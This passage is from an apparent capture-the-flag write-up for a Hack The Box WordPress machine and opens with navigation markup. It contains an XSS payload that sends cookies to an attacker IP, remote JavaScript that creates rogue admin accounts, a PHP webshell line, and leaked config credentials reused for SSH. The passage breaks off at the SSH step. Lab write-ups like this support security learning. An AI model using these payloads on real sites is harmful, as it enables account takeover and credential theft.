+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_4" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../ctf-fluidattacks/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Fluid Attacks CTF
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3_4" id="__nav_3_4_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Fluid Attacks CTF
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_4_2" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../ctf-fluidattacks/2026-2/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2026-2
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3_4_2" id="__nav_3_4_2_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_4_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_4_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    2026-2
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_4_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_4_2_2" id="__nav_3_4_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    API
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_4_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_4_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    API
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../ctf-fluidattacks/2026-2/api/coupon-collector/coupon-collector/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Coupon Collector
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../ctf-fluidattacks/2026-2/api/ni8mare-lite/ni8mare-lite/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    FlowForge (ni8mare-lite)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_4_2_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_4_2_3" id="__nav_3_4_2_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Crypto
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_4_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_4_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Crypto
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../ctf-fluidattacks/2026-2/crypto/crumble-cookie/crumble-cookie/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Crumble Cookie
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../ctf-fluidattacks/2026-2/crypto/nonce-upon-a-time/nonce-upon-a-time/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Nonce Upon a Time
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_4_2_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_4_2_4" id="__nav_3_4_2_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Mobile
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_4_2_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_4_2_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Mobile
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../ctf-fluidattacks/2026-2/mobile/deadbolt/deadbolt/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Deadbolt
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#description" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Description
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#recon-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Recon / Enumeration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Recon / Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#key-observation-hardcoded-encryption-key" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Key observation: hardcoded encryption key
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#wordpress-ajax-endpoints-webagency-theme" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        WordPress AJAX endpoints (webagency theme)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exploitation
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploitation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#foothold-stored-xss-via-encrypted-voice-results" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Foothold — Stored XSS via encrypted voice results
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Foothold — Stored XSS via encrypted voice results">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-1-cookie-exfil-proving-xss-works" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 1 — Cookie exfil (proving XSS works)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-2-escalate-xss-to-admin-user-creation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 2 — Escalate XSS to admin user creation
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-3-login-to-wordpress-admin" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 3 — Login to WordPress admin
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-4-login-webshell-via-theme-file-editor-fixed-with-requestssession" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 4 — Login + webshell via Theme File Editor (fixed with requests.Session)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-5-credentials-in-wp-configphp-ssh-as-walter" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 5 — Credentials in wp-config.php → SSH as walter
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Privilege escalation
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Privilege escalation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#internal-service-discovery-from-walter-ssh" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Internal service discovery (from walter SSH)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-admin-user-prey-automation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        The admin user &amp; prey automation
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attack-path-in-progress" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attack path in progress
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ocr-save-as-feature-arbitrary-file-write-candidate" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        OCR "Save as" feature — arbitrary file write candidate
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#root-the-save-as-feature-writes-straight-into-the-ocr-apps-own-webroot" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Root — the "Save as" feature writes straight into the OCR app's own webroot
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Flag
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#vulnerability" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Vulnerability
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#mitigation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Mitigation
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#timeline" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Timeline
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tools-used" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tools used
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="makesense">🖥️ Makesense</h1>
+<div class="grid cards">
+<ul>
+<li>
+<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M11 9h2V7h-2m1 13c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8m0-18A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10A10 10 0 0 0 12 2m-1 15h2v-6h-2z"/></svg></span> &nbsp; <strong>Machine Info</strong></p>
+<hr />
+</li>
+<li>
+<p>💻 <strong>OS:</strong> Linux (WordPress 7.0 · Apache 2.4.58 · SQLite)</p>
+</li>
+<li>⚡ <strong>Difficulty:</strong> 🟡 Medium</li>
+<li>🎯 <strong>Target:</strong> <code>makesense.htb</code> (10.129.28.208)</li>
+<li>
+<p>🔗 <strong>Link:</strong> <a href="https://www.hackthebox.com/machines/makesense">Makesense</a></p>
+</li>
+<li>
+<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m21.71 20.29-1.42 1.42a1 1 0 0 1-1.41 0L7 9.85A3.8 3.8 0 0 1 6 10a4 4 0 0 1-3.78-5.3l2.54 2.54.53-.53 1.42-1.42.53-.53L4.7 2.22A4 4 0 0 1 10 6a3.8 3.8 0 0 1-.15 1l11.86 11.88a1 1 0 0 1 0 1.41M2.29 18.88a1 1 0 0 0 0 1.41l1.42 1.42a1 1 0 0 0 1.41 0l5.47-5.46-2.83-2.83M20 2l-4 2v2l-2.17 2.17 2 2L18 8h2l2-4Z"/></svg></span> &nbsp; <strong>Tools Used</strong></p>
+<hr />
+</li>
+<li>
+<p><code>nmap</code> — Reconnaissance &amp; port scanning</p>
+</li>
+<li><code>curl</code> — HTTP requests &amp; endpoint testing</li>
+<li><code>python3</code> (<code>requests</code>, <code>pycryptodome</code>, <code>paramiko</code>, <code>Pillow</code>) — Payload forging, AES-GCM, SSH &amp; OCR image rendering</li>
+<li>WordPress admin panel — Theme File Editor webshell</li>
+</ul>
+</div>
+<div class="admonition tip">
+<p class="admonition-title">Topics Covered</p>
+<ul>
+<li>Stored XSS via a forged AES-256-GCM payload (hardcoded client-side key)</li>
+<li>WordPress admin user creation through XSS + same-origin XHR</li>
+<li>Theme File Editor webshell for RCE as <code>www-data</code></li>
+<li>Password reuse: <code>wp-config.php</code> DB creds → SSH as <code>walter</code></li>
+<li>Root via arbitrary PHP file write into a root-owned PHP dev server docroot (OCR "save output")</li>
+</ul>
+</div>
+<h2 id="description">Description</h2>
+<p>Makesense is a Linux HTB machine running WordPress 7.0 with a custom "webagency" theme that
+includes client‑side voice‑transcription (Whisper.cpp via Transformers.js). The transcription
+is encrypted with a <strong>hardcoded AES‑256‑GCM key</strong> (<code>bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI</code>)
+before being sent to the server. A <strong>stored XSS</strong> vulnerability exists in the
+<code>save_voice_results</code> AJAX endpoint: the decrypted transcription/summary fields are rendered
+without sanitisation in the WordPress admin panel, which an admin bot visits periodically.
+The XSS is used to <strong>create a new WordPress admin user</strong>, granting access to the admin
+dashboard → webshell → RCE.</p>
+<hr />
+<h2 id="recon-enumeration">Recon / Enumeration</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c1"># Port scan (full)</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>nmap<span class="w"> </span>-sV<span class="w"> </span>-sC<span class="w"> </span>-p-<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">2000</span><span class="w"> </span>-oN<span class="w"> </span>nmap/allports.txt<span class="w"> </span><span class="m">10</span>.129.28.208
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="c1"># Results:</span>
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="c1"># 22/tcp   open     ssh        OpenSSH 9.6p1</span>
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="c1"># 80/tcp   filtered http</span>
+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="c1"># 443/tcp  open     https      Apache 2.4.58, WordPress 7.0</span>
+<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="c1"># 8001/tcp filtered vcom-tunnel</span>
+</code></pre></div>
+<ul>
+<li>Domain <code>makesense.htb</code> (found in SSL cert).</li>
+<li>WordPress 7.0 with custom <strong>webagency</strong> theme.</li>
+<li>Custom REST endpoint: <code>/wp-abilities/v1/abilities</code> (returns 401 without proper auth).</li>
+<li>Admin user: <code>admin</code> (found via <code>/wp/v2/users</code>), URL: <code>http://localhost:8000</code>.</li>
+<li>Ports 80 and 8001 are <strong>filtered externally</strong> — likely internal services.</li>
+<li>XMLRPC fully enabled.</li>
+</ul>
+<h3 id="key-observation-hardcoded-encryption-key">Key observation: hardcoded encryption key</h3>
+<p>In <code>whisper-wrapper.js</code>:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="kd">const</span><span class="w"> </span><span class="nx">ENCRYPTION_KEY</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI&#39;</span><span class="p">;</span>
+</code></pre></div>
+<h3 id="wordpress-ajax-endpoints-webagency-theme">WordPress AJAX endpoints (webagency theme)</h3>
+<table>
+<thead>
+<tr>
+<th>Method</th>
+<th>Action</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>POST</td>
+<td><code>submit_contact_form</code></td>
+<td>Create a contact submission post</td>
+</tr>
+<tr>
+<td>POST</td>
+<td><code>save_voice_raw</code></td>
+<td>Upload raw audio blob</td>
+</tr>
+<tr>
+<td>POST</td>
+<td><code>save_voice_results</code></td>
+<td>Save encrypted transcription/summary</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="foothold-stored-xss-via-encrypted-voice-results">Foothold — Stored XSS via encrypted voice results</h3>
+<p>The <code>save_voice_results</code> endpoint accepts an <code>encrypted_payload</code> field containing
+AES‑256‑GCM ciphertext (IV + ciphertext + tag, base64‑encoded). The key used client‑side
+is hardcoded, so we can forge valid payloads without the browser.</p>
+<p><strong>Flow:</strong></p>
+<ol>
+<li>Get a WordPress nonce from the homepage (<code>webagency_ajax.nonce</code>).</li>
+<li>Call <code>submit_contact_form</code> → returns a <code>post_id</code>.</li>
+<li>Call <code>save_voice_results</code> with an encrypted payload containing <code>&lt;script&gt;</code>/<code>&lt;img&gt;</code> XSS.</li>
+<li>The admin bot visits the Contact Submissions list and the XSS fires.</li>
+</ol>
+<p><strong>Exploit script:</strong> <code>scripts/solve.py</code></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c1"># Key functions (simplified):</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="n">KEY</span> <span class="o">=</span> <span class="n">sha256</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span>
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="k">def</span><span class="w"> </span><span class="nf">encrypt_payload</span><span class="p">(</span><span class="n">transcription</span><span class="p">,</span> <span class="n">summary</span><span class="p">):</span>
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>    <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span><span class="s2">&quot;transcription&quot;</span><span class="p">:</span> <span class="n">transcription</span><span class="p">,</span> <span class="s2">&quot;summary&quot;</span><span class="p">:</span> <span class="n">summary</span><span class="p">})</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>    <span class="n">iv</span> <span class="o">=</span> <span class="n">get_random_bytes</span><span class="p">(</span><span class="mi">12</span><span class="p">)</span>
+<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>    <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">KEY</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_GCM</span><span class="p">,</span> <span class="n">nonce</span><span class="o">=</span><span class="n">iv</span><span class="p">)</span>
+<a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>    <span class="n">ct</span><span class="p">,</span> <span class="n">tag</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">encrypt_and_digest</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>    <span class="k">return</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">iv</span> <span class="o">+</span> <span class="n">ct</span> <span class="o">+</span> <span class="n">tag</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</code></pre></div>
+<h4 id="step-1-cookie-exfil-proving-xss-works">Step 1 — Cookie exfil (proving XSS works)</h4>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>python3<span class="w"> </span>scripts/solve.py<span class="w"> </span><span class="s1">&#39;&lt;img src=x onerror=&quot;new Image().src=\&#39;</span>http://10.10.15.205:9000/x?c<span class="o">=</span><span class="se">\&#39;</span>+document.cookie<span class="s2">&quot;&gt;&#39;</span>
+</code></pre></div>
+<p>Callback received:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>EXFIL_GET /x?c=wp-settings-time-3=1783364610
+</code></pre></div>
+<p>The admin visits the Contact Submissions page every ~60 seconds.</p>
+<h4 id="step-2-escalate-xss-to-admin-user-creation">Step 2 — Escalate XSS to admin user creation</h4>
+<p>Created an exfil+payload server <code>scripts/exfil_server.py</code> that:</p>
+<ol>
+<li>Serves <code>/p.js</code> (the JavaScript payload).</li>
+<li>Logs exfiltrated data to <code>loot/exfil.log</code>.</li>
+</ol>
+<p>The JS payload (<code>/p.js</code>) performs synchronous XHR to:</p>
+<ul>
+<li>Fetch <code>/wp-admin/user-new.php</code> and extract the CSRF nonce.</li>
+<li>POST to <code>user-new.php</code> to create a new administrator user.</li>
+</ul>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c1"># Start the exfil server in background</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>nohup<span class="w"> </span>python3<span class="w"> </span>scripts/exfil_server.py<span class="w"> </span><span class="p">&amp;</span>
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="c1"># Submit XSS that loads /p.js</span>
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>python3<span class="w"> </span>scripts/solve.py<span class="w"> </span><span class="s1">&#39;&lt;img src=x onerror=&quot;var s=document.createElement(\&quot;script\&quot;);s.src=\&quot;http://10.10.15.205:9000/p.js\&quot;;document.body.appendChild(s)&quot;&gt;&#39;</span>
+</code></pre></div>
+<p>Exfil log confirms the attack worked:</p>
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Detail</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>SERVED /p.js</code></td>
+<td>Script requested by admin browser</td>
+</tr>
+<tr>
+<td><code>x?u=ck&amp;d=...</code></td>
+<td>Cookie: <code>wp-settings-time-3=...</code></td>
+</tr>
+<tr>
+<td><code>x?u=len&amp;d=45553</code></td>
+<td>user-new.php page loaded (45 KB)</td>
+</tr>
+<tr>
+<td><code>x?u=nonce&amp;d=f78a041fc9</code></td>
+<td>CSRF nonce extracted</td>
+</tr>
+<tr>
+<td><code>x?u=cr&amp;d=xssu9/200</code></td>
+<td>User <strong>xssu9</strong> created (HTTP 200)</td>
+</tr>
+<tr>
+<td><code>x?u=cr_body&amp;d=...</code></td>
+<td>Redirect to users.php (success)</td>
+</tr>
+</tbody>
+</table>
+<p>Admin users created:</p>
+<ul>
+<li><code>xssu9</code> / <code>XssPwn123!</code></li>
+<li><code>xssu8207</code> / <code>XssPwn123!</code></li>
+</ul>
+<h4 id="step-3-login-to-wordpress-admin">Step 3 — Login to WordPress admin</h4>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>curl<span class="w"> </span>-sk<span class="w"> </span>-c<span class="w"> </span>wp_cookies.txt<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="w">  </span><span class="s2">&quot;https://makesense.htb/wp-login.php&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;log=xssu9&amp;pwd=XssPwn123!&amp;wp-submit=Log+In&amp;redirect_to=/wp-admin/&quot;</span>
+</code></pre></div>
+<p>Confirmed admin access — the dashboard shows "Howdy, xssu9".</p>
+<h4 id="step-4-login-webshell-via-theme-file-editor-fixed-with-requestssession">Step 4 — Login + webshell via Theme File Editor (fixed with <code>requests.Session</code>)</h4>
+<p>The earlier curl attempt failed because a freshly-created WP admin is forced through
+the <strong>"confirm admin email"</strong> interstitial (<code>wp-login.php?action=confirm_admin_email</code>)
+before <code>/wp-admin/</code> is usable — curl's manual cookie jar didn't survive that redirect
+chain. Fixed with a persistent <code>requests.Session</code> in
+<code>scripts/wp_admin.py</code>:</p>
+<ol>
+<li><code>POST /wp-login.php</code> with one of the XSS-created admin creds.</li>
+<li>If redirected to <code>action=confirm_admin_email</code>, submit the confirmation form
+   (<code>confirm_admin_email_nonce</code> + <code>correct-admin-email=Yes, the email address is correct</code>).</li>
+<li><code>GET /wp-admin/theme-editor.php?file=functions.php&amp;theme=webagency</code> → scrape <code>nonce</code>
+   and current <code>newcontent</code>.</li>
+<li><code>POST</code> back the same content with a webshell line appended:
+   <code>if(isset($_GET['cmd'])){echo "SHELL:"; system($_GET['cmd']);}</code></li>
+</ol>
+<p>Confirmed RCE as <code>www-data</code>:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>curl -sk &quot;https://makesense.htb/?cmd=id&quot;
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a># SHELL:uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre></div>
+<p>Ongoing shell interaction via <code>scripts/shell.py</code> (<code>python3 scripts/shell.py "&lt;cmd&gt;"</code>).</p>
+<p>Note: the admin bot re-visits the stored-XSS Contact Submissions page every ~60s and the
+payload re-fires <strong>every visit</strong>, creating a new admin user each time — 36 admin accounts
+had accumulated by the time this was noticed. The exfil listener (<code>scripts/exfil_server.py</code>)
+was killed once RCE was confirmed to stop further spam.</p>
+<h4 id="step-5-credentials-in-wp-configphp-ssh-as-walter">Step 5 — Credentials in wp-config.php → SSH as walter</h4>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>python3 scripts/shell.py &quot;cat /var/www/html/wp-config.php&quot;
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="x">define( &#39;DB_USER&#39;, &#39;walter&#39; );</span>
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="x">define( &#39;DB_PASSWORD&#39;, &#39;JbhHDAEgXvri3!&#39; );</span>
+</code></pre></div>
+<p>WordPress runs on SQLite so these DB creds are unused by the app itself, but they are
+<strong>reused as the <code>walter</code> system account password</strong> (<code>/etc/passwd</code> shows <code>walter:1000</code> and
+<code>admin:1001</code>). SSH in as walter:</p>
